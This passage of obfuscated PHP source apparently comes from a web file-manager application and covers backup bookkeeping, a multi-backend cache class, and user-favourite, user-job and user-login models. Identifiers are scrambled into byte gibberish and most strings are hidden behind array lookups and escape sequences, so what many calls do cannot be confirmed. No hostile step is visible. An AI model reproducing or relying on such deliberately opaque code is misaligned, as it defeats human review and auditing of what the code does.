$_SERVER[ùÆÎÔ“Ñ][804] . $Ì…Ü€Ê³ . $_SERVER[ùÆÎÔ“Ñ][164], $_SERVER[ùÆÎÔ“Ñ][781]); $À®ë¸ü = !1; break; } } $ä‰¬Éˆ½ = $ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][468]]; $é±¯Šãœ += 1; $³³‰Î²Ú += $ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][76]]; $„ü¸—Ø± += 1; $æµ¹£Çï += $ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][76]]; if ($³³‰Î²Ú >= 1024 * 1024 * 100) { $ë™¥ˆÁÀ = array($_SERVER[ùÆÎÔ“Ñ][821] => $ä‰¬Éˆ½, $_SERVER[ùÆÎÔ“Ñ][822] => $„ü¸—Ø±, $_SERVER[ùÆÎÔ“Ñ][823] => $æµ¹£Çï); Backup::set($ë™¥ˆÁÀ); $³³‰Î²Ú = $é±¯Šãœ = 0; } } $œÏÜİ¼˜ = count($­ÙÚÊó); $ê ¾Ğ™¡++; } while ($œÏÜİ¼˜ == $Ã¶ƒûó·); $³Î°ÕÑË->end(); $ë™¥ˆÁÀ = array($_SERVER[ùÆÎÔ“Ñ][824] => 1, $_SERVER[ùÆÎÔ“Ñ][497] => time(), $_SERVER[ùÆÎÔ“Ñ][776] => 1, $_SERVER[ùÆÎÔ“Ñ][821] => $ä‰¬Éˆ½, $_SERVER[ùÆÎÔ“Ñ][813] => $ŠÊÚ¡åä, $_SERVER[ùÆÎÔ“Ñ][812] => $ï£…‘¨, $_SERVER[ùÆÎÔ“Ñ][825] => time()); if ($é±¯Šãœ) { $ë™¥ˆÁÀ[$_SERVER[ùÆÎÔ“Ñ][822]] = $„ü¸—Ø±; $ë™¥ˆÁÀ[$_SERVER[ùÆÎÔ“Ñ][823]] = $æµ¹£Çï; } Backup::set($ë™¥ˆÁÀ); $this->_fileFilter($şËŸ›Œ®); return !0; } private function _fileExist($Õ³¥«‡¼, &$Û»„ä«, $Ğâˆıãø) { $ë“æ‡× =& $_SERVER[ùÆÎÔ“Ñ]; $Ÿ·€”Ô¡ = $Õ³¥«‡¼[$ë“æ‡×[84]]; if (in_array($Õ³¥«‡¼[$ë“æ‡×[468]], $Û»„ä«)) { return !1; } if (!in_array($Õ³¥«‡¼[$ë“æ‡×[818]], $Ğâˆıãø)) { return !1; } if (IO::exist($Ÿ·€”Ô¡)) { return !0; } $œÃÚòë› = get_path_father($Ÿ·€”Ô¡); if (IO::exist($œÃÚòë›)) { $Û»„ä«[] = $Õ³¥«‡¼[$ë“æ‡×[468]]; return !1; } $ğ®ß“Îõ = array($ë“æ‡×[818] => $Õ³¥«‡¼[$ë“æ‡×[818]], $ë“æ‡×[84] => array($ë“æ‡×[383], "{$œÃÚòë›}\45")); $Í¡ğù³½ = Model($ë“æ‡×[790])->where($ğ®ß“Îõ)->field($ë“æ‡×[469])->select(); $Û»„ä« = array_merge($Û»„ä«, array_to_keyvalue($Í¡ğù³½, $ë“æ‡×[12], $ë“æ‡×[468])); return !1; } private function _fileFilter($•ûÌ†ôÈ) { $Âˆƒê’ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($•ûÌ†ôÈ)) { return; } $ïüáë†Ò = array($Âˆƒê’[468] => array($Âˆƒê’[7], array_unique($•ûÌ†ôÈ))); $òç˜üë = Model($Âˆƒê’[826])->where($ïüáë†Ò)->field($Âˆƒê’[402])->select(); foreach ($òç˜üë as $”ïØù«º) { Model($Âˆƒê’[826])->remove($”ïØù«º[$Âˆƒê’[402]], !1); } } private function storeIds() { $’†ôô¥© =& $_SERVER[ùÆÎÔ“Ñ]; $”İ›Á•ì = Model($’†ôô¥©[768])->listData(); $²½†âò” = array(); $ı¡õäë„ = $GLOBALS[$’†ôô¥©[6]][$’†ôô¥©[89]][$’†ôô¥©[827]]; foreach ($”İ›Á•ì as $Æ‰´ëà‡) { $àœÅîùï = strtolower($Æ‰´ëà‡[$’†ôô¥©[95]]); if (!isset($ı¡õäë„[$àœÅîùï])) { continue; } $Û™¤Ñ³ü = $’†ôô¥©[74] . (isset($ı¡õäë„[$àœÅîùï]) ? $ı¡õäë„[$àœÅîùï] : ucfirst($àœÅîùï)); if (!class_exists($Û™¤Ñ³ü)) { continue; } $²½†âò”[] = $Æ‰´ëà‡[$’†ôô¥©[399]]; } return $²½†âò”; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $³³ŞË¶ =& $_SERVER[ùÆÎÔ“Ñ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ğ×Ş™À = $GLOBALS[$³³ŞË¶[6]][$³³ŞË¶[349]]; $ûœ²°Õñ = $ğ×Ş™À[$ğ×Ş™À[$³³ŞË¶[828]]]; $È×ØÆø½ = $ğ×Ş™À[$³³ŞË¶[829]]; switch ($ğ×Ş™À[$³³ŞË¶[828]]) { case $³³ŞË¶[21]: self::$handle = Model($³³ŞË¶[830]); break; case $³³ŞË¶[831]: self::$handle = new CacheRedis($ûœ²°Õñ, $È×ØÆø½); break; case $³³ŞË¶[832]: self::$handle = new CacheMemcached($ûœ²°Õñ, $È×ØÆø½); break; case $³³ŞË¶[199]: self::$handle = new CacheFile($ûœ²°Õñ, $È×ØÆø½); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ê€ç‰Î˜) { if (is_array($Ê€ç‰Î˜) || is_object($Ê€ç‰Î˜)) { $Ê€ç‰Î˜ = json_encode($Ê€ç‰Î˜); } $Ê€ç‰Î˜ = rawurlencode($Ê€ç‰Î˜); return md5(KOD_SITE_ID . $_SERVER[ùÆÎÔ“Ñ][11] . $Ê€ç‰Î˜); } public static function get($ÙÄıÛòÖ, $©İ×ÜĞ = false) { $Ú—ÆÒÂÍ = self::key($ÙÄıÛòÖ); if ($©İ×ÜĞ) { return unserialize(self::init()->get($Ú—ÆÒÂÍ)); } if (!isset(self::$memoryCache[$Ú—ÆÒÂÍ])) { $¤ÚÖâˆ¡ = self::init()->get($Ú—ÆÒÂÍ); self::$memoryCache[$Ú—ÆÒÂÍ] = unserialize($¤ÚÖâˆ¡); } return self::$memoryCache[$Ú—ÆÒÂÍ]; } public static function set($Ÿã·‚€¤, $“Èˆ¾¯˜, $€ßÎ®¹ = false) { $Óô¯‰„© = self::key($Ÿã·‚€¤); if (isset(self::$memoryCache[$Óô¯‰„©]) && self::$memoryCache[$Óô¯‰„©] === $“Èˆ¾¯˜) { return !0; } if ($€ßÎ®¹ === 0) { self::$memoryCache[$Óô¯‰„©] = $“Èˆ¾¯˜; return !0; } CacheLock::lock($Ÿã·‚€¤); $õ„®Ì÷ğ = self::init()->set($Óô¯‰„©, serialize($“Èˆ¾¯˜), $€ßÎ®¹); self::$memoryCache[$Óô¯‰„©] = $“Èˆ¾¯˜; CacheLock::unlock($Ÿã·‚€¤); return $õ„®Ì÷ğ; } public static function getCall($õæ°ÓÄ, $ÊÈñÂ¤, $ø²æË‡–, $ãæ×ÃïŒ = array()) { $úÒÀ¤¨“ =& $_SERVER[ùÆÎÔ“Ñ]; $„Äœöß¡ = self::get($õæ°ÓÄ); if ($„Äœöß¡ || $„Äœöß¡ === $úÒÀ¤¨“[12]) { return $„Äœöß¡; } $„Äœöß¡ = call_user_func_array($ø²æË‡–, $ãæ×ÃïŒ); $„Äœöß¡ = $„Äœöß¡ ? $„Äœöß¡ : $úÒÀ¤¨“[12]; self::set($õæ°ÓÄ, $„Äœöß¡, $ÊÈñÂ¤); return $„Äœöß¡; } public static function remove($¡§Äî´ü) { $ñÈ×‰Í¹ = self::key($¡§Äî´ü); unset(self::$memoryCache[$ñÈ×‰Í¹]); self::clearTimeout(); CacheLock::lock($¡§Äî´ü); $·÷÷ = self::init()->remove($ñÈ×‰Í¹); CacheLock::unlock($¡§Äî´ü); return $·÷÷; } public static function removeMemory($€úğÙĞ) { $öĞˆ¡¿ = self::key($€úğÙĞ); unset(self::$memoryCache[$öĞˆ¡¿]); } public static function clearMemory($Æ´“Ö…È = false) { if ($Æ´“Ö…È) { $Æ´“Ö…È = self::key($Æ´“Ö…È); unset(self::$memoryCache[$Æ´“Ö…È]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ùÆÎÔ“Ñ][833])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ùÆÎÔ“Ñ][834])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($—“™ğÇ, $¯ìèîİ) { $íÁ“İô¶ =& $_SERVER[ùÆÎÔ“Ñ]; $this->cachePath = $—“™ğÇ[$íÁ“İô¶[84]]; $this->prefix = $íÁ“İô¶[835]; $this->cacheTime = $¯ìèîİ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Œû¸Œ†š) { $‚™ÀÄ¬Í =& $_SERVER[ùÆÎÔ“Ñ]; $Œû¸Œ†š = str_replace(array($‚™ÀÄ¬Í[836], $‚™ÀÄ¬Í[97], $‚™ÀÄ¬Í[73]), $‚™ÀÄ¬Í[837], $Œû¸Œ†š); return $this->cachePath . $‚™ÀÄ¬Í[838] . $Œû¸Œ†š . $‚™ÀÄ¬Í[839]; } public function set($‡¼µÁö”, $Ö¾Ç´¥ë, $»¥™‡ = false) { $»¥™‡ = $»¥™‡ ? $»¥™‡ : $this->cacheTime; $Æœ‚µÌ = $this->getFile($‡¼µÁö”); if (file_put_contents($Æœ‚µÌ, $this->prefix . $Ö¾Ç´¥ë, LOCK_EX)) { @touch($Æœ‚µÌ, intval(time() + $»¥™‡)); clearstatcache(); return !0; } @unlink($Æœ‚µÌ); return !1; } public function get($şõİ™¸) { $“ûÓ¢æõ = $this->getFile($şõİ™¸); if (file_exists($“ûÓ¢æõ) && filemtime($“ûÓ¢æõ) < time()) { @unlink($“ûÓ¢æõ); return !1; } $ù—îŠ“à = @file_get_contents($“ûÓ¢æõ); return substr($ù—îŠ“à, strlen($this->prefix)); } public function remove($Ëˆî ß°) { $¨–úÌËë = $this->getFile($Ëˆî ß°); return @unlink($¨–úÌËë); } public function deleteAll() { $Ş³ßŸô¤ =& $_SERVER[ùÆÎÔ“Ñ]; $Ÿáà»ˆÅ = scandir($this->cachePath); foreach ($Ÿáà»ˆÅ as $Á¼Èşı¬) { $âİÀ¸ó = $this->cachePath . $Á¼Èşı¬; if (strpos($âİÀ¸ó, $Ş³ßŸô¤[839]) && strpos($âİÀ¸ó, $Ş³ßŸô¤[840])) { @unlink($âİÀ¸ó); } } } public function clearTimeout() { $Ñ¦ı¸© =& $_SERVER[ùÆÎÔ“Ñ]; $ö¦­ä·Ï = scandir($this->cachePath); foreach ($ö¦­ä·Ï as $û×°â–³) { $·Ğ ñè£ = $this->cachePath . $û×°â–³; if (strpos($·Ğ ñè£, $Ñ¦ı¸©[839]) && strpos($·Ğ ñè£, $Ñ¦ı¸©[840]) && filemtime($·Ğ ñè£) < time()) { @unlink($·Ğ ñè£); } } } } goto Bß‘ÒÈßê›; A°³À—à¦: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($·Ûˆ±À¡) { $ìÙÙ£¿¢ =& $_SERVER[ùÆÎÔ“Ñ]; return array($ìÙÙ£¿¢[1968] => array(USER_ID, $ìÙÙ£¿¢[2297])); } protected function listData() { $‘Àç“æ» =& $_SERVER[ùÆÎÔ“Ñ]; $å÷óÜØÂ = array($‘Àç“æ»[1658] => USER_ID, $‘Àç“æ»[484] => 0); $‰Ä‘Şö = $‘Àç“æ»[2298]; $Ü—Ş•Ÿ¹ = $this->field($‰Ä‘Şö)->where($å÷óÜØÂ)->order($‘Àç“æ»[2299])->select(); return $Ü—Ş•Ÿ¹ ? $Ü—Ş•Ÿ¹ : array(); } protected function resetCache() { } protected function listView() { $Ñ°•ñÛ· =& $_SERVER[ùÆÎÔ“Ñ]; $ùé £Ï¥ = $this->listData(); $í†¶Ôø = array_filter_by_field($ùé £Ï¥, $Ñ°•ñÛ·[33], $Ñ°•ñÛ·[416]); $ğ‡ÛŒâ = array_to_keyvalue($í†¶Ôø, $Ñ°•ñÛ·[12], $Ñ°•ñÛ·[84]); if (!$ğ‡ÛŒâ) { return $ùé £Ï¥; } $¿²Û‘ñ® = 2000; $œó•Õûã = array($Ñ°•ñÛ·[417] => array($Ñ°•ñÛ·[418], $ğ‡ÛŒâ)); $ç½´â¶‘ = Model($Ñ°•ñÛ·[826])->listSource($œó•Õûã, $¿²Û‘ñ®); $ç½´â¶‘ = array_merge($ç½´â¶‘[$Ñ°•ñÛ·[83]], $ç½´â¶‘[$Ñ°•ñÛ·[82]]); $ç½´â¶‘ = array_to_keyvalue($ç½´â¶‘, $Ñ°•ñÛ·[402]); foreach ($ùé £Ï¥ as $²“Øåò => $Ö±× ¶Ò) { $Õ€é“Œğ = $ç½´â¶‘[$Ö±× ¶Ò[$Ñ°•ñÛ·[84]]]; $Õ€é“Œğ = $Õ€é“Œğ ? $Õ€é“Œğ : array(); $ùé £Ï¥[$²“Øåò] = array_merge($Õ€é“Œğ, $Ö±× ¶Ò); } return $ùé £Ï¥; } protected function addFav($öİÔ¹‚, $ÒùÉÙ‹ = '', $óî¸ıÒ = "\163\x6f\165\162\143\145") { $Ò±ãŸçâ =& $_SERVER[ùÆÎÔ“Ñ]; $ÅÈ±õšŞ = array($Ò±ãŸçâ[1658] => USER_ID, $Ò±ãŸçâ[484] => 0, $Ò±ãŸçâ[422] => $óî¸ıÒ, $Ò±ãŸçâ[421] => $öİÔ¹‚); if ($this->where($ÅÈ±õšŞ)->find()) { return !1; } $ÅÈ±õšŞ = array($Ò±ãŸçâ[1658] => USER_ID, $Ò±ãŸçâ[484] => 0); $ØµŒÆ¿ = $this->where($ÅÈ±õšŞ)->max($Ò±ãŸçâ[1881]); if (!$ØµŒÆ¿) { $ØµŒÆ¿ = 0; } if (!$ÒùÉÙ‹ && $óî¸ıÒ == $Ò±ãŸçâ[416]) { $¨Ù²ÏúÔ = Model($Ò±ãŸçâ[1341])->where(array($Ò±ãŸçâ[417] => $öİÔ¹‚))->find(); if (!$¨Ù²ÏúÔ) { return !1; } $ÒùÉÙ‹ = $¨Ù²ÏúÔ[$Ò±ãŸçâ[32]]; } $ÒùÉÙ‹ = $this->getAutoName($ÒùÉÙ‹); $¿‰ÏåŒ– = array($Ò±ãŸçâ[1658] => USER_ID, $Ò±ãŸçâ[484] => 0, $Ò±ãŸçâ[420] => $ÒùÉÙ‹, $Ò±ãŸçâ[421] => $öİÔ¹‚, $Ò±ãŸçâ[422] => $óî¸ıÒ, $Ò±ãŸçâ[1861] => $ØµŒÆ¿ + 1); return $this->add($¿‰ÏåŒ–); } protected function remove($ñò¯­×¤) { $ÄµÑû– =& $_SERVER[ùÆÎÔ“Ñ]; $ÄÍŞÆÀ‡ = array($ÄµÑû–[1658] => USER_ID, $ÄµÑû–[419] => $ñò¯­×¤); return $this->where($ÄÍŞÆÀ‡)->delete(); } protected function removeByName($”óÏ®ûö) { $¹šëäŠß =& $_SERVER[ùÆÎÔ“Ñ]; $­ğä¨… = array($¹šëäŠß[1658] => USER_ID, $¹šëäŠß[420] => $”óÏ®ûö, $¹šëäŠß[484] => 0); return $this->where($­ğä¨…)->delete(); } protected function rename($Ì›¢¥ƒé, $©œÎûªÚ) { $ÃÉà¦™Œ =& $_SERVER[ùÆÎÔ“Ñ]; if ($Ì›¢¥ƒé == $©œÎûªÚ) { return !1; } $ª³öö = $this->getAutoName($©œÎûªÚ); if ($©œÎûªÚ != $ª³öö) { return !1; } $Òµæ¤‡ˆ = array($ÃÉà¦™Œ[1658] => USER_ID, $ÃÉà¦™Œ[484] => 0, $ÃÉà¦™Œ[32] => $Ì›¢¥ƒé); return $this->where($Òµæ¤‡ˆ)->save(array($ÃÉà¦™Œ[32] => $©œÎûªÚ)); } protected function resetSort($†ÛÏï¶ì) { $à‘•ÒŞú =& $_SERVER[ùÆÎÔ“Ñ]; $†ÛÏï¶ì = is_array($†ÛÏï¶ì) ? $†ÛÏï¶ì : array(); $ÉçÖÙ«Ş = array($à‘•ÒŞú[1658] => USER_ID); for ($íÂ˜şÚœ = 0; $íÂ˜şÚœ < count($†ÛÏï¶ì); $íÂ˜şÚœ++) { $ÉçÖÙ«Ş[$à‘•ÒŞú[419]] = $†ÛÏï¶ì[$íÂ˜şÚœ]; $this->where($ÉçÖÙ«Ş)->save(array($à‘•ÒŞú[1861] => $íÂ˜şÚœ + 1)); } return !0; } protected function moveTop($ŒİåäÚ©) { $¿õ“Íû€ =& $_SERVER[ùÆÎÔ“Ñ]; $–¾éÛ¤‹ = array($¿õ“Íû€[1658] => USER_ID, $¿õ“Íû€[484] => 0); $¹ìŞ£Ğ• = $this->where($–¾éÛ¤‹)->where(array($¿õ“Íû€[32] => $ŒİåäÚ©))->find(); if (!$¹ìŞ£Ğ•) { return; } $î©¯½ş¬ = $this->field($¿õ“Íû€[399])->where($–¾éÛ¤‹)->order($¿õ“Íû€[2299])->select(); $î©¯½ş¬ = array_to_keyvalue($î©¯½ş¬, $¿õ“Íû€[12], $¿õ“Íû€[399]); $óğ‰†³— = $î©¯½ş¬; $î©¯½ş¬ = array_remove_value($î©¯½ş¬, $¹ìŞ£Ğ•[$¿õ“Íû€[399]]); array_unshift($î©¯½ş¬, $¹ìŞ£Ğ•[$¿õ“Íû€[399]]); return $this->resetSort($î©¯½ş¬); } protected function moveBottom($Ü©Ã¤ ») { $Êï±‘İ =& $_SERVER[ùÆÎÔ“Ñ]; $Í©ï×ÁĞ = array($Êï±‘İ[1658] => USER_ID, $Êï±‘İ[484] => 0); $¤‰ Ç¤¤ = $this->where($Í©ï×ÁĞ)->max($Êï±‘İ[1881]); $ß‹Ğ¨˜ = array($Êï±‘İ[1881] => $¤‰ Ç¤¤ + 1); return $this->where($Í©ï×ÁĞ)->where(array($Êï±‘İ[32] => $Ü©Ã¤ »))->save($ß‹Ğ¨˜); } private function getAutoName($Â‡Ì¾–Ë) { $É¿Ø¬«ö =& $_SERVER[ùÆÎÔ“Ñ]; $†Ş°óô = array($É¿Ø¬«ö[1658] => USER_ID, $É¿Ø¬«ö[484] => 0); $»½’ªœ = $this->field($É¿Ø¬«ö[32])->where($†Ş°óô)->select(); $»½’ªœ = array_to_keyvalue($»½’ªœ, $É¿Ø¬«ö[12], $É¿Ø¬«ö[32]); if (!$»½’ªœ || !in_array($Â‡Ì¾–Ë, $»½’ªœ)) { return $Â‡Ì¾–Ë; } for ($†©Õ·¡ã = 0; $†©Õ·¡ã < count($»½’ªœ); $†©Õ·¡ã++) { if (!in_array($Â‡Ì¾–Ë . "\50{$†©Õ·¡ã}\51", $»½’ªœ)) { return $Â‡Ì¾–Ë . "\50{$†©Õ·¡ã}\x29"; } } return $Â‡Ì¾–Ë . "\50{$†©Õ·¡ã}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\152\157\x62\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\144\145\x73\x63", "\163\157\x72\x74"); const JOB_KEY = "\163\x65\154\146\x4a\x6f\142\x4c\x69\163\164"; public function listData($‘•üª•ï = false, $ø©Ï´í = "\163\x6f\x72\164", $ˆÂÒ±’š = false) { return parent::listData($‘•üª•ï, $ø©Ï´í, $ˆÂÒ±’š); } public function remove($¿‘±Ç­Œ) { return parent::remove($¿‘±Ç­Œ); } public function add($¿’ù™Â‚) { $ûø†ı¦ä =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->findByName($¿’ù™Â‚[$ûø†ı¦ä[32]])) { return !1; } $¿’ù™Â‚[$ûø†ı¦ä[1881]] = $this->getSort(); return parent::insert($¿’ù™Â‚); } private function getSort() { $ö²¾Èâá =& $_SERVER[ùÆÎÔ“Ñ]; $‚¸¦©‡ş = parent::listData(); $óç«Ãœ… = array_to_keyvalue($‚¸¦©‡ş, $ö²¾Èâá[12], $ö²¾Èâá[1881]); return empty($óç«Ãœ…) ? 0 : max($óç«Ãœ…) + 1; } public function update($£§··»š, $Û±ÉÃ˜ê) { $’åìÁ‰ =& $_SERVER[ùÆÎÔ“Ñ]; $²¯ó´’ = parent::listData($£§··»š); $××ŠŒº¦ = $this->findByName($Û±ÉÃ˜ê[$’åìÁ‰[32]]); if (!$²¯ó´’ || $××ŠŒº¦ && $××ŠŒº¦[$’åìÁ‰[399]] != $²¯ó´’[$’åìÁ‰[399]]) { return !1; } return parent::update($£§··»š, $Û±ÉÃ˜ê); } public function setUserJob($Ú†™×®é, $Ùëâ„˜ñ) { $²ï„ºşÄ =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_array($Ùëâ„˜ñ)) { $Ùëâ„˜ñ = array($Ùëâ„˜ñ); } $—»õæ = parent::listData(); $­ÚÀÜÔİ = array_to_keyvalue($—»õæ, $²ï„ºşÄ[32]); $¡ÅËøƒİ = $²ï„ºşÄ[378]; foreach ($Ùëâ„˜ñ as $Ïš‚¥ŒÖ) { if ($­ÚÀÜÔİ[$Ïš‚¥ŒÖ]) { $¡ÅËøƒİ .= $­ÚÀÜÔİ[$Ïš‚¥ŒÖ][$²ï„ºşÄ[399]] . $²ï„ºşÄ[50]; } else { $Ööñô×¨ = $this->add($Ïš‚¥ŒÖ); $¡ÅËøƒİ .= $Ööñô×¨ . $²ï„ºşÄ[50]; } } $¡ÅËøƒİ = rtrim($¡ÅËøƒİ, $²ï„ºşÄ[50]); Model($²ï„ºşÄ[535])->metaSet($Ú†™×®é, self::JOB_KEY, $¡ÅËøƒİ); } public function getUserJob($ÍÛ‚¬ò) { $™–‹¨Úº = Model($_SERVER[ùÆÎÔ“Ñ][535])->metaGet($ÍÛ‚¬ò); return $this->getUserJobInfo($™–‹¨Úº[self::JOB_KEY]); } public function getUserJobInfo($€ê»ó‰¯) { $…³ıƒæµ =& $_SERVER[ùÆÎÔ“Ñ]; $¦ñşÃ½· = explode($…³ıƒæµ[50], $€ê»ó‰¯); $®Øö—·› = parent::listData(); $®Øö—·› = array_remove_key($®Øö—·›, $…³ıƒæµ[200]); $ËšĞ»ó• = array(); foreach ($¦ñşÃ½· as $Ü¼èì†Í) { if (isset($®Øö—·›[$Ü¼èì†Í])) { $ËšĞ»ó•[] = $®Øö—·›[$Ü¼èì†Í]; } } return $ËšĞ»ó•; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\x65" => "\x75\x73\x65\x72\x5f\155\x65\164\141", "\155\145\x74\x61\106\x69\145\x6c\144" => "\x75\x73\x65\162\111\x44"); protected $simpleField = "\x75\x73\145\162\111\104\x2c\156\151\143\153\x4e\x61\155\145\x2c\x6e\x61\x6d\145\x2c\x61\166\x61\x74\x61\162\54\163\145\170\x2c\163\164\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¿İŞ§Î¯) { $‚Îà¨—Ê =& $_SERVER[ùÆÎÔ“Ñ]; $ƒºİ‡³ë = $‚Îà¨—Ê[2300]; return array($‚Îà¨—Ê[1935] => array($¿İŞ§Î¯[0], $ƒºİ‡³ë), $‚Îà¨—Ê[1937] => array($¿İŞ§Î¯[0], $ƒºİ‡³ë), $‚Îà¨—Ê[2301] => array($¿İŞ§Î¯[0], $ƒºİ‡³ë)); } protected function getInfo($ ò´€ŞÎ, $¾è´¶øÈ = false) { $‰¸±“—¢ = $this->getInfoSimple($ ò´€ŞÎ); if (!is_array($‰¸±“—¢)) { return array(); } if ($¾è´¶øÈ) { return $this->_getInfoApply($‰¸±“—¢); } return $this->cacheFunctionGet($_SERVER[ùÆÎÔ“Ñ][1939], $ ò´€ŞÎ); } protected function getInfoFull($ğÂâç‘, $µ·µ–ò = false) { $íüŸ¥¢© = $this->getInfoSimple($ğÂâç‘); if (!is_array($íüŸ¥¢©)) { return array(); } if ($µ·µ–ò) { return $this->_getInfoApply($íüŸ¥¢©, !0); } return $this->cacheFunctionGet($_SERVER[ùÆÎÔ“Ñ][2302], $ğÂâç‘); } private function _getInfoApply($áà§À, $¸İ¾¥†¦ = false) { $Ú—Ö‚® =& $_SERVER[ùÆÎÔ“Ñ]; if (!$áà§À) { return $áà§À; } $Öİ£¡ï = md5($Ú—Ö‚®[2303] . $áà§À[$Ú—Ö‚®[894]] . $Ú—Ö‚®[2304] . $áà§À[$Ú—Ö‚®[32]]); $áà§À = $this->_listDataApplyItem($áà§À); $ÑæÖ˜‰´ = Model($Ú—Ö‚®[1341])->metaGet($áà§À[$Ú—Ö‚®[86]][$Ú—Ö‚®[402]]); $áà§À[$Ú—Ö‚®[2305]] = $Öİ£¡ï; $áà§À[$Ú—Ö‚®[86]][$Ú—Ö‚®[2126]] = isset($ÑæÖ˜‰´[$Ú—Ö‚®[2127]]) ? $ÑæÖ˜‰´[$Ú—Ö‚®[2127]] : null; if ($¸İ¾¥†¦) { $áà§À[$Ú—Ö‚®[466]] = $this->metaGet($áà§À[$Ú—Ö‚®[1667]]); } return $áà§À; } protected function getInfoSimple($ğşé¼ì™, $¯Ù¯ ¡î = false) { $µ”ï¸Ñ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ğşé¼ì™) { return array(); } if ($¯Ù¯ ¡î) { $Ÿê³¨É£ = $this->where(array($µ”ï¸Ñ[1667] => intval($ğşé¼ì™)))->find(); if (!is_array($Ÿê³¨É£)) { return array(); } $Ÿê³¨É£[$µ”ï¸Ñ[543]] = Action($µ”ï¸Ñ[2306])->parseUrl($Ÿê³¨É£[$µ”ï¸Ñ[543]]); return $Ÿê³¨É£; } return $this->cacheFunctionGet($µ”ï¸Ñ[1940], $ğşé¼ì™); } protected function getInfoSimpleOuter($÷êõ‚) { $İÅ†İÕ† =& $_SERVER[ùÆÎÔ“Ñ]; if (!$÷êõ‚ || $÷êõ‚ == 0) { return array($İÅ†İÕ†[1667] => $İÅ†İÕ†[197], $İÅ†İÕ†[32] => $İÅ†İÕ†[162] . LNG($İÅ†İÕ†[2307]) . $İÅ†İÕ†[164], $İÅ†İÕ†[543] => STATIC_PATH . $İÅ†İÕ†[2308]); } $˜ÇÉÂÙÆ = $this->cacheFunctionGet($İÅ†İÕ†[1940], $÷êõ‚); $´‘Ù‰ÏÆ = array_field_key($˜ÇÉÂÙÆ, explode($İÅ†İÕ†[50], $this->simpleField)); if (!$´‘Ù‰ÏÆ) { return array($İÅ†İÕ†[1667] => $İÅ†İÕ†[1194], $İÅ†İÕ†[32] => $İÅ†İÕ†[162] . LNG($İÅ†İÕ†[2309]) . $İÅ†İÕ†[164], $İÅ†İÕ†[543] => STATIC_PATH . $İÅ†İÕ†[2310]); } $´‘Ù‰ÏÆ[$İÅ†İÕ†[543]] = Action($İÅ†İÕ†[2306])->parseUrl($´‘Ù‰ÏÆ[$İÅ†İÕ†[543]]); return $´‘Ù‰ÏÆ; } protected function groupUser($¬¢³ÌšÓ) { } public static function errorLang($îêôÀò) { $ê”È©Ô¬ =& $_SERVER[ùÆÎÔ“Ñ]; $±ï¾Á¶ = array(self::ERROR_USER_NOT_EXISTS => $ê”È©Ô¬[2311], self::ERROR_USER_PASSWORD_ERROR => $ê”È©Ô¬[2312], self::ERROR_USER_EXIST_NAME => $ê”È©Ô¬[2313], self::ERROR_USER_EXIST_PHONE => $ê”È©Ô¬[2314], self::ERROR_USER_EXIST_EMAIL => $ê”È©Ô¬[2315], self::ERROR_USER_LOGIN_LOCK => $ê”È©Ô¬[2316], self::ERROR_IP_NOT_ALLOW => $ê”È©Ô¬[2317], self::ERROR_USER_EXIST_NICKNAME => $ê”È©Ô¬[2318]); return LNG($±ï¾Á¶[$îêôÀò]); } public function getInfoByMeta($”°¹Œ¶¤, $¼·®×™ß) { $üÑ³Ğê— =& $_SERVER[ùÆÎÔ“Ñ]; $ˆíÅº€ = Model($üÑ³Ğê—[2319])->where(array($üÑ³Ğê—[94] => $”°¹Œ¶¤, $üÑ³Ğê—[374] => $¼·®×™ß))->find(); if ($ˆíÅº€) { return $this->getInfo($ˆíÅº€[$üÑ³Ğê—[1667]]); } return !1; } public function userLoginCheck($ˆùÚÃ£, $ß¼ôŸ„‚) { $²ı¨ÇÙ¹ =& $_SERVER[ùÆÎÔ“Ñ]; $¬öÍ‡Ú = $this->userLoginFind($ˆùÚÃ£); if (!$¬öÍ‡Ú) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¬öÍ‡Ú[$²ı¨ÇÙ¹[1667]], $ß¼ôŸ„‚)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¬öÍ‡Ú[$²ı¨ÇÙ¹[1667]]); } public function userLoginFind($˜Œ‡Ğ¨) { $ç¸Ñ Îè =& $_SERVER[ùÆÎÔ“Ñ]; $¢Ÿá÷„Ò = array($ç¸Ñ Îè[32] => $˜Œ‡Ğ¨, $ç¸Ñ Îè[542] => $˜Œ‡Ğ¨, $ç¸Ñ Îè[305] => $˜Œ‡Ğ¨, $ç¸Ñ Îè[2320] => $˜Œ‡Ğ¨, $ç¸Ñ Îè[1005] => $ç¸Ñ Îè[1007]); if ($this->nickNameRpt()) { unset($¢Ÿá÷„Ò[$ç¸Ñ Îè[542]]); } return $this->where($¢Ÿá÷„Ò)->find(); } public function 